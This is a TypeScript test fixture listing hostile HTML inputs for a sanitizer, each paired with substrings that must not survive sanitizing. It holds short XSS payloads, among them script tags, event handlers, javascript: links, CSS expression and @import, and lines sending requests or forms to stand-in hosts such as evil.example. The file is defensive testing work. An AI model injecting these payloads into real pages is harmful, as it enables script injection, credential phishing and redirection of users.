/**
 * Hostile fixtures for the sanitizer (PLAN §10). Each entry is untrusted markup
 * a capture could plausibly carry; `mustNotContain` lists substrings that, if
 * present in the sanitized output, mean the vector survived. Fuzz this set as
 * new vectors are found — "no holes" is continuously verified, not a checkbox.
 */
export interface HostileCase {
  name: string;
  html: string;
  /** Substrings that must be absent (case-insensitive) after sanitize. */
  mustNotContain: string[];
}

export const HOSTILE_CASES: HostileCase[] = [
  {
    name: "inline script tag",
    html: `<div>hi<script>alert(1)</script></div>`,
    mustNotContain: ["<script", "alert(1)"],
  },
  {
    name: "event handler attribute",
    html: `<div onclick="steal()" onmouseover="x()">msg</div>`,
    mustNotContain: ["onclick", "onmouseover", "steal("],
  },
  {
    name: "img onerror",
    html: `<img src="x" onerror="fetch('//evil')">`,
    mustNotContain: ["onerror", "fetch("],
  },
  {
    name: "iframe injection",
    html: `<iframe src="//evil.example"></iframe><div>ok</div>`,
    mustNotContain: ["<iframe", "evil.example"],
  },
  {
    name: "javascript: href",
    html: `<a href="javascript:alert(1)">link</a>`,
    mustNotContain: ["javascript:", "href="],
  },
  {
    name: "data:text/html href",
    html: `<a href="data:text/html,<script>x</script>">l</a>`,
    mustNotContain: ["data:text/html", "<script"],
  },
  {
    name: "css expression in style",
    html: `<div style="width: expression(alert(1)); color: red">m</div>`,
    mustNotContain: ["expression("],
  },
  {
    name: "css url(javascript:)",
    html: `<div style="background: url(javascript:alert(1))">m</div>`,
    mustNotContain: ["javascript:"],
  },
  {
    name: "css @import exfil",
    html: `<div style="x:1">m</div><div style='@import "//evil"'>n</div>`,
    mustNotContain: ["@import"],
  },
  {
    name: "data:text/html background",
    html: `<div style="background:url(data:text/html;base64,PHNjcmlwdD4=)">m</div>`,
    mustNotContain: ["data:text/html"],
  },
  {
    name: "svg onload",
    html: `<svg onload="alert(1)"><path d="M0 0"/></svg>`,
    mustNotContain: ["onload", "alert(1)"],
  },
  {
    name: "form + input (credential phishing surface)",
    html: `<form action="//evil"><input name="pw" type="password"></form><div>ok</div>`,
    mustNotContain: ["<form", "<input", "action="],
  },
  {
    name: "meta refresh redirect",
    html: `<meta http-equiv="refresh" content="0;url=//evil"><div>ok</div>`,
    mustNotContain: ["<meta", "refresh"],
  },
  {
    name: "base tag hijack",
    html: `<base href="//evil/"><div>ok</div>`,
    mustNotContain: ["<base"],
  },
  {
    name: "moz-binding xbl",
    html: `<div style="-moz-binding:url(//evil#x)">m</div>`,
    mustNotContain: ["-moz-binding"],
  },
];
